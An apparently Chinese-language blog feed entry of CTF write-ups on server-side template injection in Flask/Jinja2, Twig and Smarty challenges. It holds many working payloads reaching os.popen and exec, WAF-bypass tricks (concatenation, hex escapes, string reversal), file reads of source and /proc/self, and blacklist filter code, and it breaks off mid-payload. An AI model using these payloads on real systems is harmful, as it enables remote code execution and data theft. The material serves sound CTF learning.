<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sakura</title>
  
  
  <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
  
  <link href="https://sakurahack-y.github.io/"/>
  <updated>2022-02-27T09:29:21.982Z</updated>
  <id>https://sakurahack-y.github.io/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUU-模板注入专项刷题</title>
    <link href="https://sakurahack-y.github.io/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/"/>
    <id>https://sakurahack-y.github.io/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/</id>
    <published>2022-02-27T13:49:10.000Z</published>
    <updated>2022-02-27T09:29:21.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSTI："><a href="#SSTI：" class="headerlink" title="SSTI："></a>SSTI：</h2><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><ul><li>  <del>[CSCCTF 2019 Qual]FlaskLight</del></li></ul><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><ul><li>  <del>[BJDCTF2020]Cookie is so stable twig模板注入</del></li><li>  <del>[WesternCTF2018]shrine 想方设法获取config</del></li><li>  <del>[CISCN2019 华东南赛区]Web11 smarty模板注入</del></li><li>  <del>[BJDCTF2020]The mystery of ip</del></li><li>  <del>[GYCTF2020]FlaskApp debug模式一定条件下可以窃取出来pin码命令执行，但是题目过滤的不够严格导致可以直接打，比签到难一点</del></li><li>  <del>[pasecactf_2019]flask_ssti 编码绕过</del></li><li>  <del>[GWCTF 2019]你的名字</del></li><li>  <del>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</del></li></ul><h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><ul><li>  <del>[护网杯 2018]easy_tornado 因为框架比较冷门，如果不看WP的话需要自己手动翻手册，我觉得算中上偏难的题目。</del></li><li>  <del>[CISCN2019 华东南赛区]Double Secret 国赛半决赛因为大家互相出题所以都互相恶心，这题整个MD4，线下环境怎么打？</del></li></ul><h3 id="困难"><a href="#困难" class="headerlink" title="困难"></a>困难</h3><ul><li>  [QWB2021 Quals]托纳多</li></ul><h3 id="脑洞"><a href="#脑洞" class="headerlink" title="脑洞"></a>脑洞</h3><ul><li>  <del>[RootersCTF2019]I_&lt;3_Flask 用name注入。？怎么想到的</del></li></ul><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160349289.png" alt="image-20220220160349289"></p><p>发现提示</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160501360.png" alt="image-20220220160501360"></p><p>测试成功</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160529875.png" alt="image-20220220160529875"></p><p>列出所有子类</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160904114.png" alt="image-20220220160904114"></p><p>放入find.py跑一下敏感函数</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220161148184.png" alt="image-20220220161148184"></p><p>构造payload</p><pre><code class="python">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>出现未知错误</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220162228623.png" alt="image-20220220162228623"></p><p>这里应该是关键字过滤</p><p>那就绕它！</p><pre><code class="python">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('whoami').read()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220170734065.png" alt="image-20220220170734065"></p><p>同理可构造payload</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;</code></pre><p>读取flag</p><pre><code class="python">http://91ff8d9a-4ad0-491a-8d5d-c55157088e4f.node4.buuoj.cn:81/?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat flasklight/coomme_geeeett_youur_flek ').read()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220171038110.png" alt="image-20220220171038110"></p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220191434667.png" alt="image-20220220191434667"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220193930268.png" alt="image-20220220193930268"></p><p>存在模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220193953376.png" alt="image-20220220193953376"></p><p>判断为twig注入</p><p>payload</p><pre><code class="php">&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;</code></pre><p>写入输入框没有效果</p><p>hint页面有提示</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194318325.png" alt="image-20220220194318325"></p><p>抓包分析</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194407436.png" alt="image-20220220194407436"></p><p>发现cookie中有user接受我们输入的值，猜测这个模板注入参数在cookie中</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194639959.png" alt="image-20220220194639959"></p><p>成功获得flag</p><h3 id="WesternCTF2018-shrine-想方设法获取config"><a href="#WesternCTF2018-shrine-想方设法获取config" class="headerlink" title="[WesternCTF2018]shrine 想方设法获取config"></a>[WesternCTF2018]shrine 想方设法获取config</h3><p>进去源码如下</p><pre><code class="python">import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>第一个路由是显示源码的，第二个路由可以传入参数，而且有黑名单过滤，猜测要读取配置文件</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220214030161.png" alt="image-20220220214030161"></p><p>测试一下存在模板注入</p><p>要利用模板注入来读取配置，config和self被过滤，但我们仍然可以利用url_for()和get_flashed_messages()函数来读取config</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215728961.png" alt="image-20220220215728961"></p><p>发现</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215825765.png" alt="image-20220220215825765"></p><p>current_app意思应该是当前app，那我们就当前app下的config</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215947455.png" alt="image-20220220215947455"></p><p>flag出来了</p><p>最终payload</p><pre><code class="python">http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG'])&#125;&#125;</code></pre><p>同理</p><pre><code class="python">http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre><h3 id="CISCN2019-华东南赛区-Web11-smarty模板注入"><a href="#CISCN2019-华东南赛区-Web11-smarty模板注入" class="headerlink" title="[CISCN2019 华东南赛区]Web11 smarty模板注入"></a>[CISCN2019 华东南赛区]Web11 smarty模板注入</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221132600497.png" alt="image-20220221132600497"></p><p>敏感点X-Forwarded-For</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221132701696.png" alt="image-20220221132701696"></p><p>会随X-Forwarded-For的变化而变化</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133442199.png" alt="image-20220221133442199"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133450679.png" alt="image-20220221133450679"></p><p>存在模板注入</p><pre><code>X-Forwarded-For: &#123;$smarty.version&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133545104.png" alt="image-20220221133545104"></p><p>判断该模板为smart，版本号为3.1.30</p><h4 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a><code>&#123;if&#125;</code>标签</h4><p>官方文档中的描述：</p><ul><li>Smarty的<code>&#123;if&#125;</code>条件判断和PHP的if非常相似，只是增加了一些特性</li><li>每个<code>&#123;if&#125;</code>必须有一个配对的<code>&#123;/if&#125;</code>，也可以使用<code>&#123;else&#125;</code> 和 <code>&#123;elseif&#125;</code></li><li>全部的PHP条件表达式和函数都可以在if内使用，如<code>||</code>, <code>or</code>, <code>&amp;&amp;</code>, <code>and,</code> <code>is_array(),</code> 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></li></ul><p>payload</p><pre><code class="python">&#123;if phpinfo()&#125;&#123;/if&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133721417.png" alt="image-20220221133721417"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133820171.png" alt="image-20220221133820171"></p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134457254.png" alt="image-20220221134457254"></p><p>和上道题很相似,测试一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134530290.png" alt="image-20220221134530290"></p><p>模板注入有了</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134855416.png" alt="image-20220221134855416"></p><p>还是smart模板</p><p>和上道题一模一样，直接拿下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221135006801.png" alt="image-20220221135006801"></p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221141908719.png" alt="image-20220221141908719"></p><p>hint:失败的意思就是，要让程序运行报错,报错后会暴露源码。</p><p>base64decode在不会解析的时候就会报错。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221141936523.png" alt="image-20220221141936523"></p><p>拿到源码</p><pre><code class="python">@app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#39;decode&#39;))        res =  render_template_string(tmp)        flash( res )</code></pre><p>应该存在模板注入，测试一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142421065.png" alt="image-20220221142421065"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142406088.png" alt="image-20220221142406088"></p><p>模板注入有了</p><p>上payload</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142900538.png" alt="image-20220221142900538"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142907823.png" alt="image-20220221142907823"></p><p>被这里的waf过滤了</p><p>读取下app.py</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><pre><code class="python">from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64 app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = &#39;s_e_c_r_e_t_k_e_y&#39;bootstrap = Bootstrap(app) class NameForm(FlaskForm):    text = StringField(&#39;BASE64加密&#39;,validators= [DataRequired()])    submit = SubmitField(&#39;提交&#39;)class NameForm1(FlaskForm):    text = StringField(&#39;BASE64解密&#39;,validators= [DataRequired()])    submit = SubmitField(&#39;提交&#39;) def waf(str):    black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;,                  &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]    for x in black_list :        if x in str.lower() :            return 1  @app.route(&#39;/hint&#39;,methods=[&#39;GET&#39;])def hint():    txt = &quot;失败乃成功之母！！&quot;    return render_template(&quot;hint.html&quot;,txt = txt)  @app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def encode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64encode(text.encode())        tmp = &quot;结果  :&#123;0&#125;&quot;.format(str(text_decode.decode()))        res =  render_template_string(tmp)        flash(tmp)        return redirect(url_for(&#39;encode&#39;))     else :        text = &quot;&quot;        form = NameForm(text)        return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;) @app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#39;decode&#39;))        res =  render_template_string(tmp)        flash( res )        return redirect(url_for(&#39;decode&#39;))     else :        text = &quot;&quot;        form = NameForm1(text)        return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;)  @app.route(&#39;/&lt;name&gt;&#39;,methods=[&#39;GET&#39;])def not_found(name):    return render_template(&quot;404.html&quot;,name = name) if __name__ == &#39;__main__&#39;:    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)</code></pre><pre><code class="python"> def waf(str): black_list = [&quot;flag&quot;, &quot;os&quot;,        &quot;system&quot;, &quot;popen&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;chr&quot;, &quot;request&quot;,        &quot;subprocess&quot;, &quot;commands&quot;, &quot;socket&quot;, &quot;hex&quot;, &quot;base64&quot;, &quot;*&quot;, &quot;?&quot;]</code></pre><p>我们发现waf过滤了这些关键词，我们要进行绕过</p><pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221152148066.png" alt="image-20220221152148066"></p><p>读取下flag</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_f'+'lag.txt', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221152432736.png" alt="image-20220221152432736"></p><p>读取使用切片省去了拼接flag的步骤</p><pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==‘catch_warnings‘ %&#125;&#123;&#123; c.__init__.__globals__[‘__builtins__‘].open(‘txt.galf_eht_si_siht/‘[::-1],‘r‘).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h3 id="pasecactf-2019-flask-ssti-编码绕过"><a href="#pasecactf-2019-flask-ssti-编码绕过" class="headerlink" title="[pasecactf_2019]flask_ssti 编码绕过"></a>[pasecactf_2019]flask_ssti 编码绕过</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130128195.png" alt="image-20220223130128195"></p><p>存在模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130221897.png" alt="image-20220223130221897"></p><p>列举子类被禁止</p><p>经过测试，发现是 __   .    ‘  被过滤</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130556622.png" alt="image-20220223130556622"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130610494.png" alt="image-20220223130610494"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130822136.png" alt="image-20220223130822136"></p><p>转16进制绕过</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223221456791.png" alt="image-20220223221456791"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223222201394.png" alt="image-20220223222201394"></p><p>exp </p><pre><code class="python">&#123;&#123;""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("whoami")["read"]()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223224419318.png" alt="image-20220223224419318"></p><p>解法一:</p><p>读取app.py源码,发现:</p><pre><code class="python">def encode(line, key, key2): return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))app.config[&#39;flag&#39;] = encode(&#39;&#39;, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;) </code></pre><p>读取config，flag值为</p><pre><code>&#39;-M7\x10w\x12d9cT#`&#125;\x0e\x1e\x0fiS(D\x1e\x13X\x17&#123;n\x03g\x02\t\x10[#\x07/(Ak\x15^NG&#39;&#125;&gt; </code></pre><p>解密脚本:</p><pre><code class="python">key=&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;key2=&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;flag_encoded=&#39;这里放加密后的flag&#39;flag=&#39;&#39;for x in range(len(flag_encoded)):    for i in range(33,127):        if flag_encoded[x]==chr(x ^ i ^ ord(key[::-1][x]) ^ ord(key2[x])):            flag+=chr(i)            print(flag)</code></pre><p>解法二:</p><p><code>/proc/self</code>表示当前进程目录</p><p>获取当前进程打开的文件内容:cat /proc/self/fd/{id}</p><p><strong>注意：</strong>在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的。因为如果 cat读取/proc/self/cmdline/的话，得到的是 cat进程的信息。所以我们要通过题目的当前进程使用读取文件（比如，文件包含漏洞，，SSTI，，file:\\本地读取，，../../../目录穿越，，SSRF）的方式读取/proc/self/cmdline</p><pre><code>&#123;&#123;()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")&#125;&#125;</code></pre><h3 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226141959161.png" alt="image-20220226141959161"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226142008734.png" alt="image-20220226142008734"></p><p>测了一下，给了个php的报错</p><p>这里其实给了一个编出来的PHP假报错（害人）</p><p><code>&#123;&#123;...&#125;&#125;</code>装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。<br><code>&#123;% ... %&#125;</code>：装载一个控制语句。<br><code>&#123;# ... #&#125;</code>：装载一个注释，模板渲染的时候会忽视这中间的值。</p><p>双大括号这种表示方式就是可以直接回显在页面上的，而这种方式被过滤了，那我们就使用<code>&#123;% ... %&#125;</code>语句</p><p><code>&#123;% %&#125;</code>可以配合<code>if()</code>或者<code>print()</code>函数进行输出</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226143333684.png" alt="image-20220226143333684"></p><p>成功回显</p><p>lipsum是一个方法</p><p>该方法常用payload</p><pre><code class="python">&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;</code></pre><pre><code class="python">&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('whoami').read()%&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145434182.png" alt="image-20220226145434182"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145458311.png" alt="image-20220226145458311"></p><pre><code class="python">name=&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('cat /flag_1s_Hera').read()%&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145533225.png" alt="image-20220226145533225"></p><p>第二种方法</p><p>源码如下:</p><pre><code class="python">blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;];for no in blacklist:    while True:        if no in s:            s = s.replace(no, &#39;&#39;)        else:            breakreturn s</code></pre><p>先从黑名单中取出一个字符串经过循环过滤再进行下一个字符串的过滤，因此这里用双写是无法绕过的，但是这种过滤的逻辑是错误的，如下这种构造是无法被过滤的：</p><pre><code class="python">&#123;%print 